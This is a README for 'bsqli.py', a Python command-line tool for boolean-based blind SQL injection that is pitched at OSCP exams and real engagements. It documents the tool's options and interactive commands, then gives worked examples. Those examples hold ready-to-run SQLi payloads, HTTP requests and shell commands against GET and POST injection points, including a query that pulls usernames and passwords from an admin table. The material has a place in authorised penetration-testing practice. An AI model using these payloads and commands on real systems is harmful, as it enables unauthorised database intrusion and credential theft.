# bsqli.py
A nifty little boolean-based blind SQLi script for OSCP and real-life engagements.

This tool abstracts the tedious process of brute-forcing strings; and is primarily used to enumerate metadata (SQL version, DB name, host name) and tables. For instance, there may be some juicy credentials residing in some user table. Or we may want to simply perform a Proof-of-Concept for a client by grabbing the version banner.

> [!WARNING]  
> This tool is intended for authorised and ethical purposes only. The developers of this tool are not liable for any damages, legal consequences, or loss of data resulting from the use or misuse of this tool. Users are solely responsible for ensuring compliance with applicable laws and regulations.

The internals are pretty simple, but packaged into a flexible ~~battlestation~~ interface. Basically, we run `ASCII(SUBSTRING(query, idx, 1))` to obtain the numeric value of each character, then use binary search to deduce each value. Binary search allows us to deduce ASCII characters within 7 tries, instead of a linear search of ~96 tries.

Similar techniques are executed by SQLmap, so this tool can be considered a subset. But unlike SQLmap, there is no automatic exploitation or discovery built in. Instead, the user is asked to manually test and specify the necessary parameters, including the DBMS, injected parameter, and boolean conditions. As long as you understand the basic idea, this tool should be safe to use during OSCP and CTFs.

## Install ##

This script requires Python 3.10+, requests, rich, and prompt_toolkit.

```shell
pip install requests rich prompt_toolkit
```

## Usage ##

1. Manually craft a Boolean-Based Blind SQLi PoC. The request should contain
   an SQLi payload with a condition (e.g. 1=1). There should be distinct
   responses between true and false responses, either in the status code or
   response body.

2. Separate the SQLi payload (e.g. `' or '1'='1`) from the GET/POST params,
   and replace it with `{payload}`. Move your payload to the `--payload`
   argument. We do this to easily differentiate the request and payload.

3. Separate the condition (e.g. 1=1, 1=0) from the SQLi payload, and replace
   it with `{cond}`. This will be substituted with URL-encoded SQLi
   conditions to be boolean-tested.

4. Instruct the script on how to distinguish between TRUE and FALSE
   responses. Use the -bts, -bfs, -bttc, -bftc flags to do this.

5. Optionally, if there is an error response (neither TRUE/FALSE), we can
   instruct the script to ignore the response (and consider as NULL or '?')
   using the -bes, -betc, and -betn flags.
   
   This is useful if the server sporadically returns 500 due to a forbidden
   character, an internal SQL error, or rate-limiting (in which case, turn
   down the number of threads).

6. To debug, turn on verbosity (-vv) to print the payload and conditions
   being tested.

## Options ##

```txt
options:
  -h, --help            show this help message and exit
  --docs                Extensive documentation on installation, usage, and examples. (default: False)
  -V, --version         Print script version (default: False)

  -u URL, --url URL     The url to scan, with the scheme (e.g. http://192.168.1.1/admin). Possibly
                        containing an injection point marked with `{payload}`. (default: None)
  --data DATA           Url-encoded data to send with the request. Possibly containing an injection
                        point marked with `{payload}`. (default: )
  -X {GET,POST}, --method {GET,POST}
                        GET or POST (default: GET)
  -H HEADER, --header HEADER
                        Extra headers to send with requests. (default: [])
  --timeout TIMEOUT     Timeout of each request. (default: 5)
  --payload PAYLOAD     The SQLi payload. (default: None)

  --proxy PROXY         Send requests to a proxy. Example: http://127.0.0.1:8080. (default: None)
  --follow-redirects    Follows redirects in responses. (default: False)
  --max-retries MAX_RETRIES
                        Maximum number of connection retries to attempt. (default: 3)

  --dbms {MySQL,SQLServer,SQLite,OracleSQL}
                        The database management system. (default: None)
  --strategy {B}        The strategy to use: Boolean. You don't have any other choice at this moment.
                        (default: B)
  -t THREADS, --threads THREADS
                        Number of threads to use. (default: 8)

  -v                    Verbosity. -v for INFO, -vv for DEBUG messages. (default: 0)

  -bts BOOLEAN_TRUE_IF_STATUS, --boolean-true-if-status BOOLEAN_TRUE_IF_STATUS
                        If the response returns the provided status, mark the response as TRUE. All
                        other statuses are FALSE. (default: None)
  -bfs BOOLEAN_FALSE_IF_STATUS, --boolean-false-if-status BOOLEAN_FALSE_IF_STATUS
                        If the response returns the provided status, mark the response as FALSE. All
                        other statuses are TRUE. (default: None)
  -bttc BOOLEAN_TRUE_IF_TEXT_CONTAINS, --boolean-true-if-text-contains BOOLEAN_TRUE_IF_TEXT_CONTAINS
                        If the response text contains the provided text, mark the response as TRUE.
                        Otherwise, FALSE. (default: None)
  -bftc BOOLEAN_FALSE_IF_TEXT_CONTAINS, --boolean-false-if-text-contains BOOLEAN_FALSE_IF_TEXT_CONTAINS
                        If the response text contains the provided text, mark the response as FALSE.
                        Otherwise, TRUE. (default: None)
  -bes BOOLEAN_ERROR_IF_STATUS, --boolean-error-if-status BOOLEAN_ERROR_IF_STATUS
                        If the provided statuses are encountered, mark the query as an error. Accepts
                        multiple arguments (e.g. -bes 400, -bes 401). (default: [])
  -betc BOOLEAN_ERROR_IF_TEXT_CONTAINS, --boolean-error-if-text-contains BOOLEAN_ERROR_IF_TEXT_CONTAINS
                        If the provided text is encountered in the response body, mark the query as an
                        error. Accepts multiple arguments. (default: [])
  -betn BOOLEAN_ERROR_IF_TEXT_NOT_CONTAINS, --boolean-error-if-text-not-contains BOOLEAN_ERROR_IF_TEXT_NOT_CONTAINS
                        If the provided text was NOT encountered in the response body, mark the query
                        as an error. Accepts multiple arguments. (default: [])

  --cast-to-string      Cast the target output to varchar(2048) string. This allows numbers to be
                        output as well, since normally we can't SUBSTRING a number. (default: False)
  --cast-to-string-length CAST_TO_STRING_LENGTH
                        The length of the string to cast to. If you specify this, you should also
                        enable --cast-to-string. (default: 2048)
```

   
## Interface ##

Upon entering the CLI, you have some options.

1. Run pre-baked commands.

   ```
   sqli> v
   sqli> u
   ```

    - v: version
    - u: current user
    - d: db name
    - h: host name
    - s: server name

2. Query table. This is a special pre-baked command which allows you to
   enumerate a table and their columns. This hasn't been optimised for
   different versions yet (as some versions have special functions which can
   expedite this process).

   ```
   sqli> t
   table> information_schema.tables
   col> table_name
   ```

   This essentially does a `SELECT table_name FROM
   information_schema.tables`, but with some scripting involved to
   calculate, say number of entries.

   Here's another example which allows you to exfiltrate multiple columns on each row in MySQL.

   ```
   sqli> t
   table> admin
   col> concat(id,0x7c,username,0x7c,password,0x7c,firstname,0x7c,lastname,0x7c,created_on)
   ```

3. Run a custom query.

   ```
   sqli> SELECT 1
   sqli> SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='admin'
   ```


## Examples ##

Here are some examples based on real-life engagements.

### Case 1: Exploiting an Injection Point in GET Parameters ###

Observations:

- Victim runs on MySQL. (--dbms MySQL)
- Server returns a 200 status with XML containing `404` if the SQLi is
  false. (-bftc 404)
- The server also returns 200 if the SQLi is true, so we can't distinguish
  based on status code.

Request:

```http
GET /find.php?search=%25'%20AND%20(1=1)%20AND'1%25'%3d'1 HTTP/1.1
Host: vulnerable.site


```

Command:

```shell
python bsqli.py \
    -u 'http://vulnerable.site/find.php?search={payload}' \
    -X GET \
    --payload $'%\' AND {cond} AND \'1%\'=\'1' \
    --dbms MySQL \
    -bftc 404
```

### Case 2: Exploiting an Injection Point in a POST Form ###

Observations:

- Victim runs on SQLServer (--dbms SQLServer)
- Injection is in POST data (-X POST --data ...)
- The server is pretty beefy and can handle a larger number of threads
  (-t 32)
- The server returns 302 if the SQLi is successful. (-bts 302)
  We'll use this to determine if a query resulted in TRUE/FALSE.
- The server returns 500 if an error occurred (e.g. forbidden character,
  SQL error). (-bes 500)
  We'll use this to catch and discard false positives.

Request:

```http
POST / HTTP/1.1
Host: vulnerable.site
Content-Length: ...
Content-Type: application/x-www-form-urlencoded

login=a&password='%20or%20(1=1)%20--%20
```

Command:

```shell
python bsqli.py \
    -u http://vulnerable.site/login.asp \
    -X POST \
    --data=$'login=a&password={payload}' \
    --payload=$'\' or {cond} -- ' \
    --dbms SQLServer \
    -t 32 \
    -bts 302 -bes 500
```
    
